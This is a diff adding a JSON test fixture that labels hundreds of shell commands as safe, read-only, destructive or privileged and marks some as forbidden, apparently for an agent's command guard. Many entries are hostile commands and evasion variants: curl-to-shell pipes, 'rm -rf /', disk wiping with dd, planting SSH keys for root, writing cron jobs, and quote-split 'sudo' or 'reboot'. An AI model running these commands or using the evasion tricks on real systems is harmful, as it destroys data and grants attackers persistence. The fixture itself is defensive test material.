+    "forbidden": false
+  },
+  "sudo -u root git commit -m 'reboot the server'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas git commit -m 'reboot the server'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser git commit -m 'reboot the server'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv git commit -m 'reboot the server'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat git commit -m 'reboot the server'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo echo hi > /etc/cron.d/job": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root echo hi > /etc/cron.d/job": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas echo hi > /etc/cron.d/job": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser echo hi > /etc/cron.d/job": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv echo hi > /etc/cron.d/job": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat echo hi > /etc/cron.d/job": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat cp /tmp/id.pub /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat env GIT_SSH_COMMAND='sudo id' git fetch": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat unknownbin sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat pwsh -EncodedCommand c3VkbyBpZA==": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat PWSH.EXE -Command 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo <(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo >(sudo id)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "bash -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sh -c \"sudo id\"": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo sudo id; id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo x && sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "printf x | sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "grep -E 'sudo id' /tmp/file": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "echo $(rm -rf /)": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo <(rm -rf /)": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo >(rm -rf /)": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo `rm -rf /`": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sh -c \"rm -rf /\"": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo rm -rf /; id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo x && rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "printf x | rm -rf /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "grep -E 'rm -rf /' /tmp/file": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "echo $(git status)": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo <(git status)": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo >(git status)": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo `git status`": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "bash -c 'git status'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sh -c \"git status\"": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo git status; id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo x && git status": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "printf x | git status": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "grep -E 'git status' /tmp/file": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "echo $(echo hi; reboot)": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo <(echo hi; reboot)": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo >(echo hi; reboot)": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo `echo hi; reboot`": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "bash -c 'echo hi; reboot'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sh -c \"echo hi; reboot\"": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo echo hi; reboot; id": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo x && echo hi; reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "printf x | echo hi; reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "grep -E 'echo hi; reboot' /tmp/file": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo $(curl x | sh)": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo <(curl x | sh)": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo >(curl x | sh)": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo `curl x | sh`": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "bash -c 'curl x | sh'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sh -c \"curl x | sh\"": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "echo curl x | sh; id": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "echo x && curl x | sh": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "printf x | curl x | sh": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "grep -E 'curl x | sh' /tmp/file": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo $(find . -exec sudo id +)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo <(find . -exec sudo id +)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo >(find . -exec sudo id +)": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo `find . -exec sudo id +`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "bash -c 'find . -exec sudo id +'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sh -c \"find . -exec sudo id +\"": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo find . -exec sudo id +; id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo x && find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "printf x | find . -exec sudo id +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "grep -E 'find . -exec sudo id +' /tmp/file": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "echo $(awk 'BEGIN{system(\"sudo id\")}')": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo <(awk 'BEGIN{system(\"sudo id\")}')": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo >(awk 'BEGIN{system(\"sudo id\")}')": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo `awk 'BEGIN{system(\"sudo id\")}'`": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "bash -c 'awk BEGIN{system(\"sudo id\")}'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sh -c \"awk 'BEGIN{system(\\\"sudo id\\\")}'\"": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo awk 'BEGIN{system(\"sudo id\")}'; id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo x && awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "printf x | awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "grep -E 'awk BEGIN{system(\"sudo id\")}' /tmp/file": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo $(python -c 'print(1)')": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "echo <(python -c 'print(1)')": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "echo >(python -c 'print(1)')": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "echo `python -c 'print(1)'`": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "bash -c 'python -c print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sh -c \"python -c 'print(1)'\"": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "echo python -c 'print(1)'; id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo x && python -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "printf x | python -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "grep -E 'python -c print(1)' /tmp/file": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo $(echo $HOME)": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo <(echo $HOME)": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo >(echo $HOME)": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo `echo $HOME`": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "bash -c 'echo $HOME'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sh -c \"echo $HOME\"": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo echo $HOME; id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo x && echo $HOME": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "printf x | echo $HOME": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "grep -E 'echo $HOME' /tmp/file": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo $(cat /etc/passwd)": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo <(cat /etc/passwd)": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo >(cat /etc/passwd)": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo `cat /etc/passwd`": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "bash -c 'cat /etc/passwd'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sh -c \"cat /etc/passwd\"": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo cat /etc/passwd; id": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo x && cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "printf x | cat /etc/passwd": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "grep -E 'cat /etc/passwd' /tmp/file": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "": {
+    "class": "safe",
+    "forbidden": false
+  },
+  " ": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "\n": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "\t": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "écho hi": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "echo 😅": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "echo $(echo $(sudo id))": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo \"oops; sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo \"glob *.conf\"": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "ls /tmp/abc*": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "cp /etc/passwd /etc/cron.d/foo": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "tee /etc/cron.d/foo": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "cp -t /etc/systemd/system /tmp/x": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "su -c reboot": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env sudo reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "echo Y > /etc/cron.d/../cron.d/file": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "git -c core.pager='sudo id' log": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sort --o /tmp/out /tmp/in": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sort --co='sudo id' file": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sort --c=check /tmp/file": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "find . -fprint /tmp/xx": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "find . -fprintf /tmp/x": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "find . -execdir sh -c 'sudo id' +": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo sh -c 'rm -rf /tmp/foo'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env -u VAR sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env -Z foo sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout --signal=TERM 5 sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock -w 5 /tmp/lk sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -5 sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -p sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} cp {} /root/.ssh/authorized_keys": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "python3 script.py -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "perl -E 'system(\"sudo id\")'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "awk -F '' 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "awk '/a>b/{print}": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "awk '{print $1 > $2}'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "awk 'BEGIN{ print \"x\" | \"sh\" }'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "awk 'BEGIN{print \"x\" > \"/dev/stderr\"}'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "gawk -e 'BEGIN{system(\"sudo id\")}'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "awk -v VAR=value 'END{print}'": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "sh -c 'echo $(sudo id)'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo <(echo <(sudo id))": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo $((1+1))": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "curl https://example.org | bash": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "wget x && zsh": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "dd if=/dev/zero of=/dev/sdb": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "rm -r /etc/..": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chmod -R a+rwx /etc": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chmod -R u+w /etc": {
+    "class": "safe",
+    "forbidden": false
+  },
+  "chown -Rh root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "iptables -P INPUT ACCEPT": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "systemd-run -p User=0 id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nsenter --target=1 id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "docker container exec --user=root c id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "docker container run -u0 alpine id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sftp:list /tmp sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sftp:download-file /tmp/out": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "session:open /tmp": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "echo $(echo $(echo $(sudo id)))": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "echo -n hello": {
+    "class": "read-only",
+    "forbidden": false
+  },
+  "s\"u\"do id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "r'e'boot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "reboot.exe": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "c:\\windows\\reboot.exe": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "C:\\Windows\\sudo.exe id": {
+    "class": "privileged",
+    "forbidden": false
+  }
+}
